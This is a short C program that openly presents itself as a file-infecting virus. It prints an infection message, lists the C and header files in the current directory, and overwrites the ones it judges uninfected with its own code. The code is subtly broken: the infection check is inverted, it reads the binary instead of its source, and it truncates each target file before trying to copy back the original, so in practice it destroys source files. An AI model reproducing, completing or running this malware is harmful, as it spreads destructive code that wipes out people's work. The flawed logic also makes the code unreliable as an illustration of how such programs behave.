#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_LINE_LENGTH 1000

void malicious_code() {
    printf("YOU HAVE BEEN INFECTED HAHAHAH !!!\n");
}

int main(int argc, char *argv[]) {
    malicious_code();

    char self_replicating_part = 0;
    char line[MAX_LINE_LENGTH];
    char virus_code[MAX_LINE_LENGTH][MAX_LINE_LENGTH];
    int virus_code_line_count = 0;

    FILE *file = fopen(argv[0], "r");
    if (file == NULL) {
        printf("Error reading current file\n");
        exit(1);
    }

    // Read the current file line by line
    while (fgets(line, MAX_LINE_LENGTH, file)) {
        if (strcmp(line, "// VIRUS SAYS HI!\n") == 0) {
            self_replicating_part = 1;
        }
        if (!self_replicating_part) {
            strcpy(virus_code[virus_code_line_count], line);
            virus_code_line_count++;
        }
        if (strcmp(line, "// VIRUS SAYS BYE!\n") == 0) {
            break;
        }
    }
    fclose(file);

    char command[100];
    sprintf(command, "ls -1 *.c *.cpp *h");
    FILE *ls = popen(command, "r");
    if (!ls) {
        printf("Error listing files\n");
        exit(1);
    }
    
    // Read the output of the command to list all files
    char file_name[100];
    while (fgets(file_name, 100, ls)) {
        file_name[strlen(file_name) - 1] = '\0';

        // Open the file to check if it's infected
        file = fopen(file_name, "r");
        if (file == NULL) {
            printf("Error reading file: %s\n", file_name);
            exit(1);
        }

        char infected = 0;
        while (fgets(line, MAX_LINE_LENGTH, file)) {
            if (strcmp(line, "// VIRUS SAYS HI!\n")) {
                infected = 1;
                break;
            }
        }
        fclose(file);

        if (!infected) {
            // Open the file for writing
            file = fopen(file_name, "w");
            if (file == NULL) {
                printf("Error writing to file: %s\n", file_name);
                exit(1);
            }

            // Write the virus code tot the file
            for (int i = 0; i < virus_code_line_count; i++) {
                fputs(virus_code[i], file);
            }
            
            // Write a new line to separate the virus code and the original code
            fputs("\n", file);

            // Open the file for reading
            file = fopen(file_name, "r");
            if (file == NULL) {
                printf("Error reading file: %s\n", file_name);
                exit(1);
            }
            
            // Read the original code from the file
            while (fgets(line, MAX_LINE_LENGTH, file)) {
                fputs(line, file);
            }
            fclose(file);
        }
    }
    pclose(ls);
    return 0;
}
